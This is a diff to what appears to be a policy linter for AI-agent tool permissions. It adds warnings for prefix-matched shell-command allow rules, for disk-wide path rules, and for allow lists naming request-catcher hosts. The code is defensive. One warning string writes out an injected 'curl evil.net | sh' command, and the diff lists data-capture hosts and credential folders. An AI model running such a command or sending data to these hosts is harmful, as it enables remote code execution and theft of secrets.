@@ -122,6 +122,77 @@ def _is_host_name(arg: str, value: object) -> bool:
     return match is not None and match["end"].lower() not in _FILE_ENDINGS
 
 
+# A command a shell may run: by the argument's name, or by the tool's ("Bash", "shell").
+_COMMAND_ARGUMENT = re.compile(r"(^|_)(command|cmd|commandline|script)$", re.IGNORECASE)
+_SHELL_TOOL = re.compile(r"(^|[._-])(bash|shell|sh|zsh|exec|terminal|run_command)$", re.IGNORECASE)
+# A prefix that allows a whole disk or home folder.
+_BROAD_PREFIX = re.compile(r"/|~/?|[A-Za-z]:[/\\]?|/(Users|home)/?|/(Users|home)/[^/]+/?|/root/?")
+# Services made to receive and show whatever is sent to them (request catchers, tunnels,
+# paste sites): an allow list naming one lets an agent send data out.
+_CAPTURE_HOSTS = (
+    "webhook.site",
+    "requestbin.com",
+    "requestcatcher.com",
+    "hookbin.com",
+    "pipedream.net",
+    "beeceptor.com",
+    "ngrok.io",
+    "ngrok.app",
+    "ngrok-free.app",
+    "burpcollaborator.net",
+    "oastify.com",
+    "interact.sh",
+    "oast.fun",
+    "pastebin.com",
+    "transfer.sh",
+)
+
+
+def _capture_host(entry: str) -> str | None:
+    """The capture service a host_in entry ("webhook.site", ".ngrok.io", "x.ngrok.io")
+    lets requests reach, or None."""
+    name = entry.removeprefix(".")
+    return next((h for h in _CAPTURE_HOSTS if name == h or name.endswith("." + h)), None)
+
+
+def _risky_allow_warnings(rules: list[Rule]) -> list[str]:
+    """W022-W024: allow rules that let more through than they seem to."""
+    out = []
+    for rule in rules:
+        if rule.effect is not Decision.ALLOW:
+            continue
+        plain = {c.path for c in rule.when if c.op is Op.NO_SHELL_SYNTAX}
+        for c in rule.when:
+            shell = _COMMAND_ARGUMENT.search(c.path[-1]) or _SHELL_TOOL.search(rule.tool)
+            if c.op is Op.STARTSWITH and shell and c.path not in plain:
+                out.append(
+                    f'W022: rule "{rule.id}" allows "{c.label}" startswith "{c.value}"; if a '
+                    f'shell runs it, "{c.value}...; curl evil.net | sh" passes too. Add '
+                    f'{{"arg": "{c.label}", "op": "no_shell_syntax"}} or allow exact commands '
+                    f"(eq, in)."
+                )
+            if (
+                c.op is Op.STARTSWITH
+                and isinstance(c.value, str)
+                and _BROAD_PREFIX.fullmatch(c.value)
+            ):
+                out.append(
+                    f'W023: rule "{rule.id}" allows "{c.label}" startswith "{c.value}": a '
+                    f"whole disk or home folder, with keys and secrets in it (~/.ssh, "
+                    f"~/.aws, .env). Allow the project folder instead."
+                )
+            if c.op is Op.HOST_IN and isinstance(c.value, list):
+                for entry in c.value:
+                    host = _capture_host(entry) if isinstance(entry, str) else None
+                    if host:
+                        out.append(
+                            f'W024: rule "{rule.id}" allows "{entry}" in host_in: {host} '
+                            f"shows whatever is sent to it, so an agent could send data out "
+                            f"there."
+                        )
+    return out
+
+
 def _agents_key(rule: Rule) -> frozenset[str] | None:
     return None if rule.agents is None else frozenset(rule.agents)
 
@@ -231,6 +302,7 @@ def _warnings(policy: Policy) -> list[str]:
                 seen[key] = rule.id
 
     out.extend(_no_minimum_warnings(rules))
+    out.extend(_risky_allow_warnings(rules))
 
     for rule in rules:
         spec = policy.tools.get(rule.tool)
